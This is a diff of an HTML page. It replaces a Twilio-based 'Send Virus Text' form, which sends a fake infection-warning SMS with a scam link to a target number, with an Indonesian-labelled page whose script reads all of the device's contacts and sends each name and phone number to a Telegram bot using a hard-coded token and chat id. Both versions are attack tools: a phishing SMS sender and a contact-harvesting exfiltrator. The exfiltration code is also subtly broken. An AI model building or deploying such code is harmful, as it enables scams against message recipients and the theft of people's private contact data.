@@ -3,45 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send Virus Text</title>
-    <script src="https://cdn.jsdelivr.net/npm/twilio@4.0.0/dist/twilio.min.js"></script>
+    <title>Kirim Kontak ke Telebot</title>
+    <script>
+        function sendContacts() {
+            // Dapatkan semua kontak dari daftar kontak
+            const contacts = navigator.contacts;
+            const contactList = [];
+
+            contacts.find(['name', 'phoneNumbers'], (contact) => {
+                if (contact.phoneNumbers.length > 0) {
+                    contactList.push({
+                        name: contact.name,
+                        phone: contact.phoneNumbers[0].value
+                    });
+                }
+            }, (error) => {
+                console.error('Error accessing contacts:', error);
+            }, {
+                multiple: true
+            });
+
+            // Kirim setiap kontak ke Telebot
+            contactList.forEach(contact => {
+                const message = `Nama: ${contact.name}, Nomor Telepon: ${contact.phone}`;
+
+                fetch('https://api.telegram.org/bot<8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc>/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: '<1966317946>',
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Kontak dikirim:', contact.name);
+                    } else {
+                        console.error('Gagal mengirim kontak:', contact.name);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        }
+    </script>
 </head>
 <body>
-    <h1>Send Virus Text</h1>
-    <form id="messageform">
-        <label for="targetPhone">Target Phone Number:</label>
-        <input type="text" id="targetPhone" name="targetPhone" required>
-        <br>
-        <label for="message">Virus Text:</label>
-        <textarea id="message" name="message" required>Your phone has been infected with a virus. Click this link to fix it: http://example.com/virus</textarea>
-        <br>
-        <button type="submit">Send Virus Text</button>
-    </form>
-
-    <script>
-        document.getElementById('messageform').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const targetPhone = document.getElementById('targetPhone').value;
-            const message = document.getElementById('message').value;
-
-            Twilio.Chat.Client.create().then(function(client) {
-                client.getChannelBySid('CHANNEL_SID').then(function(channel) {
-                    const messageOptions = {
-                        body: message,
-                        to: targetPhone
-                    };
-                    channel.sendMessage(messageOptions).then(function(message) {
-                        alert('Virus Text sent successfully!');
-                    }).catch(function(error) {
-                        alert('Error sending Virus Text: ' + error.message);
-                    });
-                }).catch(function(error) {
-                    alert('Error getting channel: ' + error.message);
-                });
-            }).catch(function(error) {
-                alert('Error creating client: ' + error.message);
-            });
-        });
-    </script>
+    <h1>Kirim Semua Kontak ke Telebot</h1>
+    <button onclick="sendContacts()">Kirim Kontak</button>
 </body>
 </html>
